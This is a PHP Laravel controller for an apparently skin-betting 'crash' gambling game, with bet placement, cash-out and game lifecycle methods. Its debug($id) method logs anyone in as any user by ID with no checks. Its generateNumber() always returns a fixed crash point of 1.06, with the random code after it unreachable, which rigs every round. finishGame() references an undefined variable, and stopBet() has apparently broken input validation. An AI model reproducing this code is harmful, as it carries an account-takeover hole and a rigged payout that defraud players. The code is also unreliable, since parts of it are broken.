<?php

namespace App\Http\Controllers;

use App\User;
use App\Game;
use App\Bet;
use App\Skin;
use App\RSkin;
use Auth;

use Carbon\Carbon;
use Illuminate\Http\Request;
use Str;
use Storage;
use DB;
use Exception;
use Illuminate\Support\Facades\Redis;

class MainController extends Controller {
	public $game;

    public function bb()
    {
        
    }

	public function debug($id)
    {
        $user = User::find($id);
        Auth::login($user, true);
        return redirect('/');
    }

    public function generateNumber(){
        return 1.06;
        return mt_rand(1, 10).".". mt_rand(0, 9).".". mt_rand(0, 9);
    }

	public function __construct()
    {
        $this->getCurrentGame();
    }

    public function getCurrentGame()
    {
        $this->game = Game::all()->last();
        if (is_null($this->game)) $this->newGame();
        return $this->game;
    }

	public function newGame(){
        $game = new Game;
        $game->salt = Str::random(30);
		$game->number = $this->generateNumber();
		$game->save();
        $this->game = $game;
        return $game;
    }

	public function finishGame(){
	    $bets = $this->game->bets()->where('number','<=', $this->game->number)->get();
		$profit = 0;
		foreach ($bets as $bet){
	        $user = User::find($bet->user_id);
	        $win = $bet->calcBet() * $bet->number;
			$user->money += $win;
			$user->save();
			$profit += $add;
		}
		$this->game->profit = $this->game->calcBets() - $profit;
		$this->game->status = 'finished';
		$this->game->save();
    }

	public function startGame(){
        $this->game->status = 'current';
        $this->game->save();
        return $this->game;
    }

	public function newBet(Request $request)
    {
        $bets = $this->game->bets()->where('user_id', $request->user()->id)->count();
		if ($bets >= 1)
			return response()->json(['text' => 'Ошибка. Можно ставить только 1 раз за игру.', 'type' => 'error']);
        if (!$request->has('skins'))
        	return response()->json(['text' => 'Ошибка', 'type' => 'error']);
        if ($this->game->status == 'current')
        	return response()->json(['text' => 'Дождитесь следующей игры!', 'type' => 'error']);
        $skins = json_decode($request->input('skins'));
		$number = $request->input('number');
		if ($number < 1)
			return response()->json(['text' => 'Ошибка. Неверное число', 'type' => 'error']);
		foreach ($skins as $skin) {
			if(!$request->user()->skins()->where('id', $skin)->exists())
				return response()->json(['text' => 'Ошибка. Нет скина', 'type' => 'error']);
		}
        $bet = new Bet;
        $bet->user()->associate($request->user());
        $bet->game()->associate($this->game);
        $bet->number = $number;
        $bet->save();
        foreach ($skins as $skin) {
            $rskin = RSkin::find($skin);
            $bet->skins()->attach($rskin->id);
            $rskin->status = 'bet';
            $rskin->save();
        }
        Redis::publish('crash.bet', json_encode([
            'number' => $number,
			'skins' => $bet->skins()->with('skin')->get(),
			'sum' => $bet->calcBet(),
            'userid' => $request->user()->id,
			'username' => $request->user()->username,
			'image' => $request->user()->avatar,
            'win' => $bet->winSkin(),
        ]));
        return response()->json(['text' => 'Действие выполнено.', 'type' => 'success']);
    }

    public function cancelBet(Request $request){
        
        return response()->json(['text' => 'Действие выполнено.', 'type' => 'success']);
    }

    public function stopBet(Request $request){
    	if (!$request->has('number'))
        	return response()->json(['text' => 'Ошибка', 'type' => 'error']);
    	$number = $request->input('number');
    	if (!is_double($number) || $number < 1)
        	return response()->json(['text' => 'Ошибка', 'type' => 'error']);
        $bet = $this->game->bets()->where('user_id', $request->user()->id)->first();
        if ($number > $bet->number)
        	return response()->json(['text' => 'Ошибка. Игра завершена', 'type' => 'error']);
        $bet->number = $number;
        $bet->save();
        Redis::publish('crash.stop', json_encode([
            'number' => $number,
            'userid' => $request->user()->id,
        ]));
        return response()->json(['text' => 'Действие выполнено.', 'type' => 'success']);
    }

    public function index(Request $request)
    {
        $gameid = $this->game->id;
        $games = Game::where('status', 'finished')->orderBy('id', 'desc')->take(10)->get();
        $tbets = $this->game->bets()->with('user')->get();

        $bets = array();
        foreach ($tbets as $bet) {
            $skins = $bet->skins()->with('skin')->get();
            $user = $bet->user;
            array_push($bets, [
                'number' => $bet->number,
                'skins' => $skins,
                'sum' => $bet->calcBet(),
                'userid' => $user->id,
                'username' => $user->username,
                'image' => $user->avatar,
                'win' => $bet->winSkin(),
            ]);
        }
        $skins = array();
        $money = 0;
        if(Auth::check()){
            $money = Auth::user()->money;
            $tskins = $request->user()->skins()->with('skin')->get();
            foreach ($tskins as $skin) {
                array_push($skins, [
                    'id' => $skin->id,
                    'name' => $skin->skin->name,
                    'quality' => $skin->skin->quality,
                    'stattrak' => $skin->skin->stattrak,
                    'image' => $skin->skin->image,
                    'price' => $skin->price,
                    'status' => $skin->status,
                ]);
            }
        }

        return view('main', compact('gameid', 'bets', 'skins', 'games', 'money'));
    }
}